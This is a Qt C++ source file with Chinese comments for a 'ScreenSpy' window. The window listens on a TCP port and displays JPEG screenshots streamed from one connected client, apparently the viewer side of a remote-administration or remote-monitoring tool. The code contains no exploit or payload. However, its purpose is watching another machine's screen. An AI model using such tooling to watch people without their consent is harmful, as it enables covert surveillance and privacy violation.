#include "screenspy.h"

ScreenSpy::ScreenSpy( QWidget *parent) :
    QWidget(parent), mScreenLen(0)
{
    // 初始化窗口
    const int w = 800, h = 450;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);

    // 图片label
    mScreenLabel = new QLabel(this);
    mScreenLabel->setGeometry(0,0, w, h);
    mScreenLabel->setScaledContents(true);
}

int ScreenSpy::startScreenSpyServer(QString userName)
{
    // 设置窗口标题
    this->setWindowTitle(userName.append("-屏幕监控"));

    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启屏幕监控服务端失败";
        deleteLater();
        return -1;
    }

    // 开启监控窗口
    this->show();

    return mServer->server()->serverPort();
}

void ScreenSpy::newConnection(QTcpSocket *s)
{
    // 新增客户
    mSock = new TcpSocket(s, this);
    connect(mSock,SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // 不再监听新客户
    mServer->server()->close();
}

void ScreenSpy::processBuffer()
{
    QByteArray *buf = mSock->buffer();

    while((unsigned int)buf->size() >= sizeof(ScreenSpyHeader)) {
        // 读取头
        if (mScreenLen == 0) {
            if ((unsigned int)buf->size() >= sizeof(ScreenSpyHeader)) {
                ScreenSpyHeader header;
                memcpy(&header, buf->data(), sizeof(ScreenSpyHeader));
                buf->remove(0, sizeof(ScreenSpyHeader));

                // 设置图片数据
                mScreenLen = header.len;
            } else {
                break;
            }
        }

        // 读取JPG图片
        if (mScreenLen > 0){
            if ((unsigned int)buf->size() >= mScreenLen) {
                // 保存新图片
                mScreenPixmap.loadFromData((unsigned char*)buf->data(), mScreenLen);

                // 显示图片
                mScreenLabel->setPixmap(mScreenPixmap);

                // 擦除数据
                buf->remove(0, mScreenLen);
                mScreenLen = 0;
            } else {
                break;
            }
        }
    }
}

void ScreenSpy::resizeEvent(QResizeEvent *)
{
    // 重设mScreenLabel大小
    mScreenLabel->setGeometry(0,0,width(), height());
}

void ScreenSpy::closeEvent(QCloseEvent *)
{
    // 删除窗口
    deleteLater();
}
